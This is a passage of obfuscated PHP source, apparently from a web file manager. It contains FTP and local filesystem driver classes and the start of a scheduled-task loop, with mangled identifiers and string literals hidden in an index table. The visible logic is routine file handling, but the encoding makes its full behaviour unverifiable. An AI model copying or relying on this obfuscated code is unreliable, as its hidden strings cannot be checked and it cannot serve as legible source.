$©£«¾Ù¼ = $öûÓÇú—[$êõÊºü³[33]] == $êõÊºü³[79] ? !0 : !1; if ($èáùì²¼) { $this->cacheMethod($êõÊºü³[198], $ÌÙ‰µ¡¸, $©£«¾Ù¼); $this->cacheMethod($êõÊºü³[199], $ÌÙ‰µ¡¸, $öûÓÇú—); } if ($©£«¾Ù¼) { $ç›²š–Ò[] = $ÌÙ‰µ¡¸; if ($İòİòçÀ) { $this->fileList($ÌÙ‰µ¡¸, $ç›²š–Ò, $ç“Ç‰Š¹, $İòİòçÀ); } continue; } $ç“Ç‰Š¹[] = $öûÓÇú—; } if ($èáùì²¼) { $this->cacheMethod($êõÊºü³[198], $î¥–«ûÖ, !0); } } private function _listItem($ÏßÛ­—ê) { if (empty($ÏßÛ­—ê)) { return array(); } $Ï¢èôŸ® = preg_split($_SERVER[ì…™Î¶Ï][1353], $ÏßÛ­—ê); if (count($Ï¢èôŸ®) <= 9) { return $Ï¢èôŸ®; } $Ï¢èôŸ®[8] = trim(substr($ÏßÛ­—ê, strpos($ÏßÛ­—ê, $Ï¢èôŸ®[7]) + strlen($Ï¢èôŸ®[7]))); return array_splice($Ï¢èôŸ®, 0, 9); } public function listPath($§Í­íº, $×Ãñ»À“ = false) { $Óúåë³¸ =& $_SERVER[ì…™Î¶Ï]; if (!$this->_isconn()) { return !1; } $÷–‘òíï = $›£õüêç = array(); $this->fileList($§Í­íº, $÷–‘òíï, $›£õüêç); foreach ($÷–‘òíï as $ü¡„ÔÄì => $¼×Õ¬ƒ·) { $÷–‘òíï[$ü¡„ÔÄì] = $this->folderInfo($¼×Õ¬ƒ·, $×Ãñ»À“); } foreach ($›£õüêç as $ü¡„ÔÄì => $¼×Õ¬ƒ·) { $›£õüêç[$ü¡„ÔÄì] = $this->fileInfo($¼×Õ¬ƒ·[$Óúåë³¸[32]], $×Ãñ»À“, $¼×Õ¬ƒ·); } return array($Óúåë³¸[77] => $÷–‘òíï, $Óúåë³¸[76] => $›£õüêç); } public function has($–şÉ¡¬Ç, $Ÿ¯©¦ƒ® = false, $»ÚÍ§¯— = true) { $„‰Š‡ƒŸ =& $_SERVER[ì…™Î¶Ï]; $šŠô£¢ = $ÖÇ×À•¬ = array(); $¼ŸÒ”Ö¡ = $Ÿ¯©¦ƒ® ? !0 : !1; $this->fileList($–şÉ¡¬Ç, $šŠô£¢, $ÖÇ×À•¬, $¼ŸÒ”Ö¡); if ($Ÿ¯©¦ƒ®) { return array($„‰Š‡ƒŸ[202] => count($ÖÇ×À•¬), $„‰Š‡ƒŸ[203] => count($šŠô£¢)); } if ($»ÚÍ§¯—) { if (count($ÖÇ×À•¬)) { return !0; } } else { if (count($šŠô£¢)) { return !0; } } return !1; } public function listAll($ƒ¹á¿½è) { $ûÏÕÈ =& $_SERVER[ì…™Î¶Ï]; if (!$this->_isconn()) { return !1; } $¹‚´úãÁ = $ÚÉÂˆã = array(); $this->fileList($ƒ¹á¿½è, $¹‚´úãÁ, $ÚÉÂˆã, !0); $¬œşş“ï = array(); foreach ($ÚÉÂˆã as $›õÃ—ó) { $¬œşş“ï[$›õÃ—ó[$ûÏÕÈ[32]]] = $›õÃ—ó[$ûÏÕÈ[80]]; } foreach ($¹‚´úãÁ as $›õÃ—ó) { if (is_string($›õÃ—ó)) { $¬œşş“ï[$›õÃ—ó] = 0; } } return $this->listAllFiles($ƒ¹á¿½è, array_keys($¬œşş“ï), $¬œşş“ï); } public function getContent($Œ™àóßÃ) { if (!$this->_isconn()) { return !1; } $Œ™àóßÃ = $this->iconvSystem($Œ™àóßÃ); return $this->fileSubstr($Œ™àóßÃ); } public function setContent($…ë¯ºµù, $Ä°ÁĞØ™ = '') { if (!$this->_isconn()) { return !1; } $±ƒ¥¨ÆÕ = $this->pathThis($this->iconvSystem($…ë¯ºµù)); $”›ÈŠêÆ = $this->tempFile($±ƒ¥¨ÆÕ); file_put_contents($”›ÈŠêÆ, $Ä°ÁĞØ™); $´Ù¾â¡ = $this->upload($…ë¯ºµù, $this->iconvApp($”›ÈŠêÆ)); $this->tempFileRemve($”›ÈŠêÆ); return $´Ù¾â¡; } public function fileSubstr($§¥Ãß¶ß, $Ğ¼„àæ = 0, $ì†õï´ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($§¥Ãß¶ß, $Ğ¼„àæ, $ì†õï´); } private function ftpRequest($˜áØ‘éË, $ŞÑäßëÔ = 0, $»×úæ  = false) { $˜áØ‘éË = $this->iconvSystem($˜áØ‘éË); $ÎÉÉ—î = $this->scheme . $this->host . $_SERVER[ì…™Î¶Ï][4] . $this->port; $ï¡Íà¾ = curl_init(); curl_setopt($ï¡Íà¾, CURLOPT_URL, $ÎÉÉ—î . $this->pathEncode($˜áØ‘éË)); curl_setopt($ï¡Íà¾, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($»×úæ ) { $¦Şƒ¥ˆ¸ = $ŞÑäßëÔ + $»×úæ  - 1; curl_setopt($ï¡Íà¾, CURLOPT_RANGE, "{$ŞÑäßëÔ}\55{$¦Şƒ¥ˆ¸}"); } curl_setopt($ï¡Íà¾, CURLOPT_RETURNTRANSFER, 1); $Ç„§ıÔ = curl_exec($ï¡Íà¾); curl_close($ï¡Íà¾); return $Ç„§ıÔ; } public function upload($×Íßùí, $÷Ğ‡à×í, $…üÛğ = false, $ÆÍ¼å™Î = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($×Íßùí))) { return !1; } $×Íßùí = $this->iconvSystem($×Íßùí); $÷Ğ‡à×í = $this->iconvSystem($÷Ğ‡à×í); $×²€²‹ø = ftp_nb_put($this->connect, $×Íßùí, $÷Ğ‡à×í, FTP_BINARY); while ($×²€²‹ø == FTP_MOREDATA) { $×²€²‹ø = ftp_nb_continue($this->connect); } if ($×²€²‹ø != FTP_FINISHED) { return !1; } return $this->getPathOuter($×Íßùí); } public function download($À“—ó¦Ü, $ì‹ó¯‘ = '') { if (!$this->_isconn()) { return !1; } $„²Å¦Šı = $this->pathFather($ì‹ó¯‘); if (!IO::mkdir($„²Å¦Šı)) { return !1; } $À“—ó¦Ü = $this->iconvSystem($À“—ó¦Ü); $ì‹ó¯‘ = $this->iconvSystem($ì‹ó¯‘); $ƒ¯†ˆ¼• = ftp_nb_get($this->connect, $ì‹ó¯‘, $À“—ó¦Ü, FTP_BINARY); while ($ƒ¯†ˆ¼• == FTP_MOREDATA) { $ƒ¯†ˆ¼• = ftp_nb_continue($this->connect); } if ($ƒ¯†ˆ¼• != FTP_FINISHED) { return !1; } return $this->iconvApp($ì‹ó¯‘); } public function exist($‘ÁÆş–İ) { return $this->isFile($‘ÁÆş–İ) || $this->isFolder($‘ÁÆş–İ); } public function isFile($õçı‚‚ã) { return !$this->isFolder($õçı‚‚ã) && $this->objectMeta($õçı‚‚ã); } public function isFolder($›”ûÉ˜„) { return $this->cacheMethod($_SERVER[ì…™Î¶Ï][198], $›”ûÉ˜„); } protected function objectMeta($Äá†£–û) { return $this->cacheMethod($_SERVER[ì…™Î¶Ï][199], $Äá†£–û); } protected function _objectMeta($…›ßØå·) { $á¥Ä“ù® =& $_SERVER[ì…™Î¶Ï]; if ($…›ßØå· == $á¥Ä“ù®[12] || $…›ßØå· == $á¥Ä“ù®[8]) { return array(); } if (!$this->_isconn()) { return !1; } $…›ßØå· = $this->iconvSystem($…›ßØå·); $áÙÙ×ïô = array($á¥Ä“ù®[32] => $this->iconvApp($…›ßØå·), $á¥Ä“ù®[33] => $á¥Ä“ù®[192], $á¥Ä“ù®[80] => 0); @ftp_chdir($this->connect, $á¥Ä“ù®[8]); $ƒóº†”÷ = @ftp_size($this->connect, $…›ßØå·); if ($ƒóº†”÷ != -1) { $áÙÙ×ïô[$á¥Ä“ù®[80]] = $ƒóº†”÷; } else { $«µø€İ = @ftp_chdir($this->connect, $…›ßØå·); if (!$«µø€İ) { return !1; } $áÙÙ×ïô[$á¥Ä“ù®[33]] = $á¥Ä“ù®[79]; } return $áÙÙ×ïô; } protected function _isFolder($ÚûƒóÛò) { $¾¯—œÎŞ =& $_SERVER[ì…™Î¶Ï]; if ($ÚûƒóÛò == $¾¯—œÎŞ[12] || $ÚûƒóÛò == $¾¯—œÎŞ[8]) { return !0; } $±·‘Ş¯¬ = $this->_objectMeta($ÚûƒóÛò); return isset($±·‘Ş¯¬[$¾¯—œÎŞ[33]]) && $±·‘Ş¯¬[$¾¯—œÎŞ[33]] == $¾¯—œÎŞ[79] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÙàäÀØ’) { if (substr($ÙàäÀØ’, 0, 2) == $_SERVER[ì…™Î¶Ï][1344]) { $ÙàäÀØ’ = BASIC_PATH . substr($ÙàäÀØ’, 2); } return $ÙàäÀØ’; } public function iconvApp($†×íşôÆ) { $âü—’‰ =& $_SERVER[ì…™Î¶Ï]; global $config; return $this->iconvTo($†×íşôÆ, $config[$âü—’‰[1342]], $config[$âü—’‰[1341]]); } public function iconvSystem($™ö¤•) { $¨ÂËááÅ =& $_SERVER[ì…™Î¶Ï]; global $config; return $this->iconvTo($™ö¤•, $config[$¨ÂËááÅ[1341]], $config[$¨ÂËááÅ[1342]]); } public function getPathOuter($¾ó³Ç›¶) { $•Œ˜…²Ï =& $_SERVER[ì…™Î¶Ï]; $Ï¢ •ºù = $this->iconvApp($this->pathBase); $¾ó³Ç›¶ = $this->iconvApp($¾ó³Ç›¶); if (substr($Ï¢ •ºù, 0, 2) == $•Œ˜…²Ï[1344]) { $Ï¢ •ºù = BASIC_PATH . substr($Ï¢ •ºù, 2); } if (substr($¾ó³Ç›¶, 0, 2) == $•Œ˜…²Ï[1344]) { $¾ó³Ç›¶ = BASIC_PATH . substr($¾ó³Ç›¶, 2); } $Ï¢ •ºù = KodIO::clear($Ï¢ •ºù); $¾ó³Ç›¶ = KodIO::clear($¾ó³Ç›¶); $¾ó³Ç›¶ = substr($¾ó³Ç›¶, strlen($Ï¢ •ºù)); if (empty($this->pathDriver)) { return $¾ó³Ç›¶; } return $this->pathDriver . $•Œ˜…²Ï[8] . ltrim($¾ó³Ç›¶, $•Œ˜…²Ï[8]); } public function mkfile($ğøª“áú, $€ú¨˜òô = '', $­êü¬Ï = REPEAT_RENAME) { $ğøª“áú = $this->iconvSystem($ğøª“áú); @touch($ğøª“áú); if ($€ú¨˜òô) { file_put_contents($ğøª“áú, $€ú¨˜òô); } @chmod($ğøª“áú, $this->pathAuth); return is_file($ğøª“áú) ? $this->getPathOuter($ğøª“áú) : !1; } public function mkdir($üëãò¤Œ, $Š»›ĞÌ˜ = REPEAT_SKIP) { $üëãò¤Œ = $this->iconvSystem($üëãò¤Œ); if (is_dir($üëãò¤Œ)) { return $this->getPathOuter($üëãò¤Œ); } @mkdir($üëãò¤Œ, $this->pathAuth, !0); @chmod($üëãò¤Œ, $this->pathAuth); return is_dir($üëãò¤Œ) ? $this->getPathOuter($üëãò¤Œ) : !1; } public function copyFile($‰ŸÂ¿ÈŸ, $áÄŞä›) { $this->mkdir($this->pathFather($áÄŞä›)); $‰ŸÂ¿ÈŸ = $this->iconvSystem($‰ŸÂ¿ÈŸ); $áÄŞä› = $this->iconvSystem($áÄŞä›); $îˆÌ¯ú = copy_64($‰ŸÂ¿ÈŸ, $áÄŞä›); @chmod($áÄŞä›, $this->pathAuth); return $îˆÌ¯ú ? $this->getPathOuter($áÄŞä›) : !1; } public function moveFile($è»ö¡Åß, $±îŠ±§¢) { $this->mkdir($this->pathFather($±îŠ±§¢)); $è»ö¡Åß = $this->iconvSystem($è»ö¡Åß); $±îŠ±§¢ = $this->iconvSystem($±îŠ±§¢); $·²˜ıÉ = intval(@rename($è»ö¡Åß, $±îŠ±§¢)); if (!$·²˜ıÉ) { if ($·²˜ıÉ = intval(@copy_64($è»ö¡Åß, $±îŠ±§¢))) { @unlink($è»ö¡Åß); } } @chmod($±îŠ±§¢, $this->pathAuth); return $·²˜ıÉ ? $this->getPathOuter($±îŠ±§¢) : !1; } public function movePath($‹Æ¤ìÚî, $§’Ïí¿ø, $×—ëïˆş = false) { $•ò”‚ıö =& $_SERVER[ì…™Î¶Ï]; $‹Æ¤ìÚî = $this->iconvSystem($‹Æ¤ìÚî); $§’Ïí¿ø = $this->iconvSystem($§’Ïí¿ø); $âúª§Œş = rtrim($§’Ïí¿ø, $•ò”‚ıö[8]) . $•ò”‚ıö[8] . ($×—ëïˆş ? $×—ëïˆş : get_path_this($‹Æ¤ìÚî)); if (file_exists($âúª§Œş)) { return !1; } $òÊãòü© = intval(@rename($‹Æ¤ìÚî, $âúª§Œş)); $òÊãòü© = file_exists($âúª§Œş); return $òÊãòü© ? $this->getPathOuter($âúª§Œş) : !1; } public function delFile($»Ô‘¹Ä) { $»Ô‘¹Ä = $this->iconvSystem($»Ô‘¹Ä); if (!@unlink($»Ô‘¹Ä)) { @chmod($»Ô‘¹Ä, $this->pathAuth); if (!@unlink($»Ô‘¹Ä)) { return !1; } } else { return !0; } } public function delFolder($¾È“Ğ¥Ì) { $¥°ğ·³´ =& $_SERVER[ì…™Î¶Ï]; $¾È“Ğ¥Ì = $this->iconvSystem($¾È“Ğ¥Ì); if (!is_dir($¾È“Ğ¥Ì)) { return !0; } if (!($¹Ç»‡£ = opendir($¾È“Ğ¥Ì))) { return !1; } while (($¶Öü…Ë¦ = readdir($¹Ç»‡£)) !== !1) { if ($¶Öü…Ë¦ == $¥°ğ·³´[10] || $¶Öü…Ë¦ == $¥°ğ·³´[1351]) { continue; } $°·˜ÄúÍ = $¾È“Ğ¥Ì . $¥°ğ·³´[8] . $¶Öü…Ë¦; if (is_file($°·˜ÄúÍ) || is_link($°·˜ÄúÍ)) { if (!unlink($°·˜ÄúÍ)) { chmod($°·˜ÄúÍ, $this->pathAuth); if (!unlink($°·˜ÄúÍ)) { return !1; } } } else { if (is_dir($°·˜ÄúÍ)) { chmod($°·˜ÄúÍ, $this->pathAuth); $°·˜ÄúÍ = $this->iconvApp($°·˜ÄúÍ); if (!$this->delFolder($°·˜ÄúÍ)) { return !1; } } } } closedir($¹Ç»‡£); return rmdir($¾È“Ğ¥Ì); } public function rename($£›é˜, $¸·òŠò) { $”¾¼Ã =& $_SERVER[ì…™Î¶Ï]; $şÖ Äñ“ = $this->fileNameAuto($this->pathFather($£›é˜), $¸·òŠò); $şÖ Äñ“ = $this->iconvSystem($şÖ Äñ“); $£›é˜ = $this->iconvSystem($£›é˜); $÷‰±¬¢ = $this->pathFather($£›é˜); $ğÁ¸³øª = rtrim($÷‰±¬¢, $”¾¼Ã[8]) . $”¾¼Ã[8] . $şÖ Äñ“; $ã×—ÅÒ = @rename($£›é˜, $ğÁ¸³øª); $ğÁ¸³øª = $this->iconvApp($ğÁ¸³øª); return $ã×—ÅÒ ? $this->getPathOuter($ğÁ¸³øª) : !1; } public function size($¦æÀ¯üÍ) { $¦æÀ¯üÍ = $this->iconvSystem($¦æÀ¯üÍ); return filesize_64($¦æÀ¯üÍ); } public function info($£¥ ‰æÃ) { $£¥ ‰æÃ = $this->iconvSystem($£¥ ‰æÃ); if ($this->isFolder($£¥ ‰æÃ)) { return $this->folderInfo($£¥ ‰æÃ); } else { if ($this->isFile($£¥ ‰æÃ)) { return $this->fileInfo($£¥ ‰æÃ); } } return !1; } protected function infoChildren($Ü½Õş÷ò, &$éÈƒæâÁ, $Ã—†Õ¡ = true) { $©¤Í¥æ’ =& $_SERVER[ì…™Î¶Ï]; check_abort_echo(); $Ü½Õş÷ò = rtrim($Ü½Õş÷ò, $©¤Í¥æ’[8]) . $©¤Í¥æ’[8]; if ($Ã—†Õ¡) { $Ü½Õş÷ò = $this->iconvSystem($Ü½Õş÷ò); } if (!($˜ç˜×»¦ = @opendir($Ü½Õş÷ò))) { return; } while (($àù‘¥Ÿü = readdir($˜ç˜×»¦)) !== !1) { if ($àù‘¥Ÿü == $©¤Í¥æ’[10] || $àù‘¥Ÿü == $©¤Í¥æ’[1351]) { continue; } $° İ¾ = $Ü½Õş÷ò . $àù‘¥Ÿü; if (is_file($° İ¾) || is_link($° İ¾)) { $éÈƒæâÁ[$©¤Í¥æ’[81]]++; $éÈƒæâÁ[$©¤Í¥æ’[80]] += filesize_64($° İ¾); } else { if (is_dir($° İ¾)) { $éÈƒæâÁ[$©¤Í¥æ’[82]]++; $this->infoChildren($° İ¾, $éÈƒæâÁ, !1); } } } closedir($˜ç˜×»¦); } private function folderInfo($¡­¥öû, $ĞÑ‡ïüñ = false) { $œ‚‰˜¶¤ =& $_SERVER[ì…™Î¶Ï]; $¡­¥öû = rtrim($¡­¥öû, $œ‚‰˜¶¤[8]) . $œ‚‰˜¶¤[8]; $İ¤Ôàë› = $this->iconvApp($this->pathThis($¡­¥öû)); if ($ĞÑ‡ïüñ) { return array($œ‚‰˜¶¤[32] => $İ¤Ôàë›, $œ‚‰˜¶¤[78] => $this->getPathOuter($¡­¥öû), $œ‚‰˜¶¤[33] => $œ‚‰˜¶¤[79]); } $ó¹Ä±÷¬ = array($œ‚‰˜¶¤[32] => $İ¤Ôàë›, $œ‚‰˜¶¤[78] => $this->getPathOuter($¡­¥öû), $œ‚‰˜¶¤[33] => $œ‚‰˜¶¤[79], $œ‚‰˜¶¤[193] => @filectime($¡­¥öû), $œ‚‰˜¶¤[86] => @filemtime($¡­¥öû), $œ‚‰˜¶¤[1354] => @fileatime($¡­¥öû), $œ‚‰˜¶¤[1355] => is_readable($¡­¥öû), $œ‚‰˜¶¤[1356] => is_writable($¡­¥öû), $œ‚‰˜¶¤[1357] => get_mode($¡­¥öû)); return $ó¹Ä±÷¬; } private function fileInfo($Êú”îÎ, $üÇšÒ ª = false) { $ÏÕ‡çõ» =& $_SERVER[ì…™Î¶Ï]; $ˆğ´šá¬ = $this->iconvApp($this->pathThis($Êú”îÎ)); if ($üÇšÒ ª) { return array($ÏÕ‡çõ»[32] => $ˆğ´šá¬, $ÏÕ‡çõ»[78] => $this->getPathOuter($Êú”îÎ), $ÏÕ‡çõ»[33] => $ÏÕ‡çõ»[192], $ÏÕ‡çõ»[80] => $this->size($Êú”îÎ), $ÏÕ‡çõ»[167] => $this->ext($ˆğ´šá¬)); } $Áéî›Ò = array($ÏÕ‡çõ»[32] => $ˆğ´šá¬, $ÏÕ‡çõ»[78] => $this->getPathOuter($Êú”îÎ), $ÏÕ‡çõ»[33] => $ÏÕ‡çõ»[192], $ÏÕ‡çõ»[193] => @filectime($Êú”îÎ), $ÏÕ‡çõ»[86] => @filemtime($Êú”îÎ), $ÏÕ‡çõ»[1354] => @fileatime($Êú”îÎ), $ÏÕ‡çõ»[80] => $this->size($Êú”îÎ), $ÏÕ‡çõ»[167] => $this->ext($ˆğ´šá¬), $ÏÕ‡çõ»[1355] => is_readable($Êú”îÎ), $ÏÕ‡çõ»[1356] => is_writable($Êú”îÎ), $ÏÕ‡çõ»[1357] => get_mode($Êú”îÎ)); return $Áéî›Ò; } public function exist($ÎÃÔ¥½†) { $ÎÃÔ¥½† = $this->iconvSystem($ÎÃÔ¥½†); return @file_exists($ÎÃÔ¥½†); } public function isFile($ª¹–Äò) { $ª¹–Äò = $this->iconvSystem($ª¹–Äò); return @is_file($ª¹–Äò); } public function isFolder($Æ¹š±‘à) { $Æ¹š±‘à = $this->iconvSystem($Æ¹š±‘à); return @is_dir($Æ¹š±‘à); } public function listPath($å¹İÓ™, $£ˆñÑ‚ç = false) { $±æöÕáÔ =& $_SERVER[ì…™Î¶Ï]; $å¹İÓ™ = $this->iconvSystem($å¹İÓ™); $å¹İÓ™ = rtrim($å¹İÓ™, $±æöÕáÔ[8]) . $±æöÕáÔ[8]; $îæâÈ = array($±æöÕáÔ[77] => array(), $±æöÕáÔ[76] => array()); if (!($º®¼Ï¼© = @opendir($å¹İÓ™))) { return $îæâÈ; } while (($Î¦‘Ûõ† = readdir($º®¼Ï¼©)) !== !1) { if ($Î¦‘Ûõ† == $±æöÕáÔ[10] || $Î¦‘Ûõ† == $±æöÕáÔ[1351]) { continue; } $ºøÇ«êƒ = $å¹İÓ™ . $Î¦‘Ûõ†; if (is_file($ºøÇ«êƒ)) { $îæâÈ[$±æöÕáÔ[76]][] = $this->fileInfo($ºøÇ«êƒ, $£ˆñÑ‚ç); } else { $îæâÈ[$±æöÕáÔ[77]][] = $this->folderInfo($ºøÇ«êƒ, $£ˆñÑ‚ç); } } closedir($º®¼Ï¼©); return $îæâÈ; } public function listAll($áŠªİ, &$ÚË”¯´‘ = array()) { $‚…ÙÓ‡ =& $_SERVER[ì…™Î¶Ï]; $áŠªİ = $this->iconvSystem($áŠªİ); $áŠªİ = rtrim($áŠªİ, $‚…ÙÓ‡[8]) . $‚…ÙÓ‡[8]; if (!($‚¾ã¬š¶ = @opendir($áŠªİ))) { return $ÚË”¯´‘; } while (($‘İ§ËÙ· = readdir($‚¾ã¬š¶)) !== !1) { if ($‘İ§ËÙ· == $‚…ÙÓ‡[10] || $‘İ§ËÙ· == $‚…ÙÓ‡[1351]) { continue; } $€Ş­Í—Ÿ = $áŠªİ . $‘İ§ËÙ·; if (is_dir($€Ş­Í—Ÿ) && !is_link($€Ş­Í—Ÿ)) { $ÚË”¯´‘[] = array($‚…ÙÓ‡[78] => $€Ş­Í—Ÿ . $‚…ÙÓ‡[8], $‚…ÙÓ‡[79] => 1, $‚…ÙÓ‡[86] => @filemtime($€Ş­Í—Ÿ), $‚…ÙÓ‡[80] => 0); $this->listAll($€Ş­Í—Ÿ, $ÚË”¯´‘); } else { $ÚË”¯´‘[] = array($‚…ÙÓ‡[78] => $€Ş­Í—Ÿ, $‚…ÙÓ‡[79] => 0, $‚…ÙÓ‡[86] => @filemtime($€Ş­Í—Ÿ), $‚…ÙÓ‡[80] => $this->size($€Ş­Í—Ÿ)); } } closedir($‚¾ã¬š¶); return $ÚË”¯´‘; } public function has($âÜ¤†ƒ, $ÜÍñşÌ± = false, $ÉÒŠŞ«§ = true) { $¤œêµ¨¿ =& $_SERVER[ì…™Î¶Ï]; $âÜ¤†ƒ = $this->iconvSystem($âÜ¤†ƒ); $âÜ¤†ƒ = rtrim($âÜ¤†ƒ, $¤œêµ¨¿[8]) . $¤œêµ¨¿[8]; if (!($µ¦°Ã…È = @opendir($âÜ¤†ƒ))) { return !1; } $†áìÖ¾ = 0; $ùÍğÜËğ = 0; $¦°ÅøÀÍ = 0; while (($ÏŸÅ Ëê = readdir($µ¦°Ã…È)) !== !1) { if ($ÏŸÅ Ëê == $¤œêµ¨¿[10] || $ÏŸÅ Ëê == $¤œêµ¨¿[1351]) { continue; } $ó²ó¶îş = $âÜ¤†ƒ . $ÏŸÅ Ëê; if ($ÜÍñşÌ±) { $¦°ÅøÀÍ++; if (@is_file($ó²ó¶îş)) { $†áìÖ¾++; } else { $ùÍğÜËğ++; } if ($¦°ÅøÀÍ > 10000) { break; } continue; } if ($ÉÒŠŞ«§) { if (@is_file($ó²ó¶îş)) { return !0; } } else { if (@is_dir($ó²ó¶îş . $¤œêµ¨¿[8])) { return !0; } } } closedir($µ¦°Ã…È); if ($ÜÍñşÌ±) { return array($¤œêµ¨¿[202] => $†áìÖ¾, $¤œêµ¨¿[203] => $ùÍğÜËğ); } return !1; } public function hashSimple($Ò’ªœÒÑ) { $ã¬Äì¡ı =& $_SERVER[ì…™Î¶Ï]; if (!$Ò’ªœÒÑ) { return md5($ã¬Äì¡ı[12]); } $Ò’ªœÒÑ = $this->iconvSystem($Ò’ªœÒÑ); $ùö³¶½’ = $this->size($Ò’ªœÒÑ); $ê¿£Ù« = 200; $ŠÈ’‰£… = 50; if ($ùö³¶½’ <= $ê¿£Ù« * $ŠÈ’‰£…) { return $this->hashMd5($Ò’ªœÒÑ) . $ùö³¶½’; } $ËÒï»›œ = $ã¬Äì¡ı[12]; $ëçÚËç¸ = intval($ùö³¶½’ / $ŠÈ’‰£…); $Ø÷š÷Á° = fopen($Ò’ªœÒÑ, $ã¬Äì¡ı[1358]); if (!$Ø÷š÷Á°) { return $ËÒï»›œ; } for ($Ğ¢·ñÄ’ = 0; $Ğ¢·ñÄ’ < $ŠÈ’‰£…; $Ğ¢·ñÄ’++) { fseek_64($Ø÷š÷Á°, $ëçÚËç¸ * $Ğ¢·ñÄ’); $ËÒï»›œ .= fread($Ø÷š÷Á°, $ê¿£Ù«); } fseek_64($Ø÷š÷Á°, $ùö³¶½’ - $ê¿£Ù«); $ËÒï»›œ .= fread($Ø÷š÷Á°, $ê¿£Ù«); fclose($Ø÷š÷Á°); return md5($ËÒï»›œ) . $ùö³¶½’; } public function getContent($Ï»ÆË¯Œ) { $Ï»ÆË¯Œ = $this->iconvSystem($Ï»ÆË¯Œ); return file_get_contents($Ï»ÆË¯Œ); } public function setContent($×ôö¬Ê, $‘Ô¢ê“‰ = '') { $×ôö¬Ê = $this->iconvSystem($×ôö¬Ê); $’óÒ×Ã = @file_put_contents($×ôö¬Ê, $‘Ô¢ê“‰, LOCK_EX); clearstatcache(); @chmod($×ôö¬Ê, $this->pathAuth); return $’óÒ×Ã === !1 ? !1 : !0; } public function fileSubstr($÷…µ°ã, $û©öŞ› = 0, $¹ÍòãÅÜ = false) { $Ô¢ó»Ç­ =& $_SERVER[ì…™Î¶Ï]; $÷…µ°ã = $this->iconvSystem($÷…µ°ã); if ($¹ÍòãÅÜ === !1) { $¹ÍòãÅÜ = $this->size($÷…µ°ã); } if ($¹ÍòãÅÜ <= 0) { return $Ô¢ó»Ç­[12]; } $¶°ôº‘ = fopen($÷…µ°ã, $Ô¢ó»Ç­[1358]); if (!$¶°ôº‘) { return !1; } fseek_64($¶°ôº‘, $û©öŞ›); $¤Úãòªü = fread($¶°ôº‘, $¹ÍòãÅÜ); fclose($¶°ôº‘); return $¤Úãòªü; } public function upload($³ßµİ¬á, $Âğ¿ğ©¨, $è¡ïŒ”ù = false, $é‚‡¬» = REPEAT_REPLACE) { if ($è¡ïŒ”ù) { return $this->moveFile($Âğ¿ğ©¨, $³ßµİ¬á); } return $this->copyFile($Âğ¿ğ©¨, $³ßµİ¬á); } public function setModifyTime($êÖ‡•ï‹, $ÇÔ³œÇ = '') { @touch($êÖ‡•ï‹, intval($ÇÔ³œÇ)); } public function download($È²Ö‚ê, $±Ø¼Ì‰Û) { return $this->iconvSystem($È²Ö‚ê); } } goto A ¯«ÖÓ¯‰; DŒÑêÜïã¶: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ıö·ÌÄ˜ =& $_SERVER[ì…™Î¶Ï]; if (self::valueGet($ıö·ÌÄ˜[725]) != $ıö·ÌÄ˜[89]) { return; } if (self::valueGet($ıö·ÌÄ˜[1591]) == $ıö·ÌÄ˜[89]) { $Ù¹Ôó” = self::valueGet($ıö·ÌÄ˜[1592]); if (time() - $Ù¹Ôó” > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($ıö·ÌÄ˜[1591], $ıö·ÌÄ˜[89]); self::log($ıö·ÌÄ˜[1593]); Hook::bind($ıö·ÌÄ˜[1594], $ıö·ÌÄ˜[1595]); $²¶¶Ã¨ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ıö·ÌÄ˜[725]) != $ıö·ÌÄ˜[89]) { self::valueSet($ıö·ÌÄ˜[1591], $ıö·ÌÄ˜[190]); self::log($ıö·ÌÄ˜[1596]); die; } $Ù…˜Ø×ù = time(); if ($Ù…˜Ø×ù - $²¶¶Ã¨ >= 60) { self::valueSet(array($ıö·ÌÄ˜[1591] => $ıö·ÌÄ˜[89], $ıö·ÌÄ˜[1592] => $Ù…˜Ø×ù), !1); $²¶¶Ã¨ = $Ù…˜Ø×ù; } if (!file_exists(USER_SYSTEM . $ıö·ÌÄ˜[1597])) { self::valueSet(array($ıö·ÌÄ˜[1591] => $ıö·ÌÄ˜[190], $ıö·ÌÄ˜[725] => $ıö·ÌÄ˜[190]), !1); self::log($ıö·ÌÄ˜[1598]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $°›¡µ« =& $_SERVER[ì…™Î¶Ï]; http_close(); self::valueSet($°›¡µ«[725], $°›¡µ«[190]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($°›¡µ«[1591] => $°›¡µ«[190], $°›¡µ«[725] => $°›¡µ«[89]), !1); } public static function shutdownEvent() { $ÅçÖ—í =& $_SERVER[ì…™Î¶Ï]; self::valueSet($ÅçÖ—í[1591], $ÅçÖ—í[190]); self::log($ÅçÖ—í[1599]); } public static function config($í‚Ô˜ÏÔ, $Äè¿ÚÊÉ) { self::valueSet($_SERVER[ì…™Î¶Ï][725], $í‚Ô˜ÏÔ); } private static function taskRunAll() { $âÙ®Éì® =& $_SERVER[ì…™Î¶Ï]; $©¨¦å„· = timeFloat(); $áÃâ¡×ğ = Model($âÙ®Éì®[1600])->listData(); $«¡ÎŞø¸ = count($áÃâ¡×ğ); for ($´¾¾èÌš = 0; $´¾¾èÌš < $«¡ÎŞø¸; $´¾¾èÌš++) { $¢Ó£ü‚¶ = $áÃâ¡×ğ[$´¾¾èÌš]; if (!$¢Ó£ü‚¶[$âÙ®Éì®[392]] || $¢Ó£ü‚¶[$âÙ®Éì®[1601]] != $âÙ®Éì®[89]) { continue; } if (!self::taskTimeCheck($¢Ó£ü‚¶)) { continue; } self::taskRun($¢Ó£ü‚¶); } Hook::trigger($âÙ®Éì®[1602]); self::taskQueueRun($©¨¦å„·); } private static function taskQueueRun($ÍµÃçÄ) { $ùìòåêÆ = 10; while (!0) { $—Õ¸ö¯ = TaskQueue::run(); if ($—Õ¸ö¯ === !1) { break; } if (timeFloat() - $ÍµÃçÄ 